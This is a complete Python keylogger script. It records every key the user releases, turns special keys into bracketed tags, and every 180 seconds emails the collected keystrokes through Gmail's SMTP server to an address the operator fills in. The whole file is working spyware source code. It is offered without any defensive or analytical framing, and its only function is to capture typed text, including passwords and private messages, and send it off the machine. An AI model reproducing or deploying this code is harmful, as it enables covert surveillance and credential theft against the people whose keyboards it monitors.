import keyboard
import smtplib

from threading import Semaphore, Timer

SEND_REPORT_EVERY = 180 #Seconds
EMAIL_ADDRESS = "put_your_email_here"
EMAIL_PASSWORD = "your_email_password"


class Keylogger:
    def __init__(self, interval):

        self.interval = interval

        self.log = ""

        self.semaphore = Semaphore(0)

    def callback(self, event):

        name = event.name
        if len(name) > 1:

            if name == "space":

                name = " "
            elif name == "enter":

                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:

                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def sendmail(self, email, password, message):

        server = smtplib.SMTP(host="smtp.gmail.com", port=587)

        server.starttls()

        server.login(email, password)

        server.sendmail(email, email, message)

        server.quit()

    def report(self):

        if self.log:

            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)

        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):

        keyboard.on_release(callback=self.callback)

        self.report()

        self.semaphore.acquire()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()